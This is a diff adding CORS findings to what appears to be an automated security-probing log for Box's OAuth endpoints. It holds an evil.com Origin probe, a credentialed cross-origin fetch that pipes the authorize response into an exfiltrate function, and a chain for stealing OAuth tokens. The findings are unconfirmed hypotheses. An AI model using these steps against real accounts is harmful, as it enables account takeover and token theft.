@@ -994,3 +994,18 @@ testability: AUTH_HELPED
 [NEXT] PROBE: OPTIONS https://account.box.com/api/oauth2/authorize with User-Agent: box-research/1.0 +(research) and Origin: https://evil.com — record full CORS preflight response. 1 req/2s.
 [NEXT] PROBE: GET https://account.box.com/api/oauth2/token with User-Agent: box-research/1.0 +(research) — test response body content for token format. Record full JSON response. 1 req/2s.
 [NEXT] PROBE: GET https://app.box.com/ with User-Agent: box-research/1.0 +(research) and Origin: https://evil.com — check if the main app origin has any CORS headers on unauthenticated pages. 1 req/2s.
+## 2026-08-21 22:32:27 UTC m.box.com (mimo)
+class: CORS
+asset: account.box.com/api/oauth2/authorize
+confidence: 90
+reasoning: Preflight confirms GET allowed with Authorization header. Cross-origin JS can send authenticated GET to authorize endpoint and read response HTML including any embedded tokens, state, or redirect URLs. Combined with /login CSRF reflection, enables attacker-controlled OAuth flow.
+verify_steps: (AUTH_HELPED) Login to box.com, then from attacker origin: fetch('https://account.box.com/api/oauth2/authorize?response_type=code&client_id=LEGITIMATE',{credentials:'include'}).then(r=>r.text()).then(t=>exfiltrate(t))
+impact: Cross-origin read of OAuth authorization responses. Severity: High
+testability: AUTH_HELPED
+class: CORS
+asset: account.box.com (login + authorize + token)
+confidence: 92
+reasoning: Three endpoints form exploit chain: (1) /login reflects origin + exposes CSRF token, (2) /api/oauth2/authorize reflects origin + allows Authorization header, (3) /api/oauth2/token has wildcard *. Attacker page reads CSRF from login, constructs auth request with victim credentials, reads auth code from authorize response, exchanges for tokens at token endpoint.
+verify_steps: (HUMAN_ONLY) Complete OAuth flow from attacker page reading all responses cross-origin
+impact: Full account takeover via OAuth token theft. Severity: Critical
+testability: AUTH_HELPED
